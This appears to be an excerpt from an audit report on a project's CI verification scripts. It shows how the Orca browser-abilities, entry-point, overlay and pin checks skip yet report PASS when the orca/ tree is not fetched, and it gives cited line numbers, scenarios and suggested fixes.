**What is wrong.** Both rows are --quick. The CI quick job fetches upstream/ but never fetches orca/. orca-browser-entry-points returns a single SKIP for everything when orca/src is absent. That includes clause 2 (the browser route targets pb-web-tab) and clause 5 (HOST_PREFIX equals ORCA_PANES_ROUTE_PREFIX), which read only PowerBrowser files. orca-browser-abilities runs only the trace without orca/src and skips clauses (a)-(g). That includes (f)/(g), the SERVED_AUTOMATION_METHODS versus chrome AGENT_METHODS comparison. Both exit 0, and verify-platform.sh records any exit 0 as PASS. On every push and pull request the BRW-02/BRW-03 ability and entry-point gates report PASS without comparing anything.

**Scenario.** A PR adds 'browser.upload' to chrome's AGENT_METHODS (with a child arm, so tab-scope's mechanism clause is green) but not to ORCA_BROWSER_ABILITIES' served set or DISPOSITIONS. Alternatively, it retargets the orca-panes 'browser' route to 'hosted-pane'. The CI 'Run the static verification table' job prints `orca-browser-abilities: PASS -- trace scenario green; SKIP -- abilities: no fetched Orca tree` and `orca-browser-entry-points: SKIP -- no fetched Orca tree`, and the summary lists both as PASS.

**Evidence.** scripts/verify-orca-browser-entry-points.mjs:422 `if (!existsSync(join(root, REL.orca, 'src'))) return { fails, skips: ['no fetched Orca tree ...'] ... }` (before clauses 2 and 5 at :443-468); :659 `if (r.skips.length) { console.log(`${NAME}: SKIP -- ...`); return 0; }`. scripts/verify-orca-browser-abilities.mjs:277 `if (!existsSync(join(root, REL.orca, 'src'))) return { fails, skips: [...] }` and :409 PASS with SKIP, exit 0. scripts/verify-platform.sh:6985-6986 `if [ "$row_ok" -eq 1 ]; then SUMMARY+=("$label: PASS")`. .github/workflows/verify.yml:80 fetches only upstream, :93 runs `--quick`.

**Suggested fix.** Move the orca-independent clauses (route row, served prefix, AGENT_METHODS equal to SERVED_AUTOMATION_METHODS) ahead of the orca/src gate so they always run. Have the driver recognise a SKIP line (or a distinct exit code such as 77) and report it as SKIP, failing --gate on any SKIP not on a known-open list. Alternatively, fetch orca/ (source only) in verify.yml.

**Verifier (CONFIRMED, medium).** Both rows are in run_own_checks' CHECKS array, the --quick set (verify-platform.sh:3659, rows at :4060 and :4072). verify.yml runs fetch-upstream.sh and apply-patches.sh (:80) and then `verify-platform.sh --quick` (:93). No step runs fetch-orca.sh. Only release.yml does, and orca/ is gitignored (/orca/ in .gitignore:44). The entry-points check returns a SKIP at :422 when orca/src is absent. That return comes before clause 2 (route targets pb-web-tab) and clause 5 (HOST_PREFIX equals ORCA_PANES_ROUTE_PREFIX), and both read only PowerBrowser files. main at :659 prints SKIP and returns 0. The abilities check runs the trace and then returns a SKIP at :277 before (a)-(g), including the chrome AGENT_METHODS comparison, and main at :409 returns 0. The driver records any exit 0 as PASS (:6985-6986) and never inspects SKIP output. The CI summary therefore shows PASS for both rows without comparing anything. Locally, with orca/ fetched, the rows do compare.

*Checked at:* scripts/verify-orca-browser-entry-points.mjs:422,443-468,659; scripts/verify-orca-browser-abilities.mjs:277,409; scripts/verify-platform.sh:6985-6986; .github/workflows/verify.yml:80,93

### harness-static-structure-01: Hosted PR gate (verify.yml --quick) has no orca/, so the overlay replay, pin-to-checkout and several pane/editor/add-project checks all SKIP and pass

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-overlay.mjs:259`
- **Category:** false-green

**What is wrong.** .github/workflows/verify.yml fetches upstream/ and builds Theia but never runs scripts/fetch-orca.sh. Every quick-tier row that needs orca/ prints a SKIP and exits 0 in that job. verify.yml also states "none is silently skipped", which is false for these rows. The affected steps are:
- orca-overlay: pinned-blob drift, pre-image check, half-file replacement, shadowing, and the hermetic replay that catches a hand-edited patch applying as a no-op (the recorded failure mode).
- orca-pin: step f, HEAD and refs/tags/<tag> against the commit.
- orca-pane-routes: the whole check and its self-test (both exit at line 548 before any work).
- orca-editor-routes: the check, the self-test and the routeOpenFile behaviour cases.
- orca-no-pb-add-project: the whole check.
- orca-landing-selectors: the bundle clauses.
The fragment check in orca-pin is tautological in CI, because generate.mjs rebuilds the fragment from the same manifest.

**Scenario.** A pull request hand-edits a hunk body in orca-overlay/patches/*.patch, or changes orca_commit in configuration.toml to a commit the tag does not peel to. verify.yml runs generate, then --quick. orca-overlay prints "SKIP -- orca/ is not a fetched git checkout" and exits 0, and orca-pin has no orca/ to compare against. The PR is green. The no-op only surfaces later in build-orca.sh or rebase-orca.

**Preconditions.** Pull request or push CI on the hosted verify job.
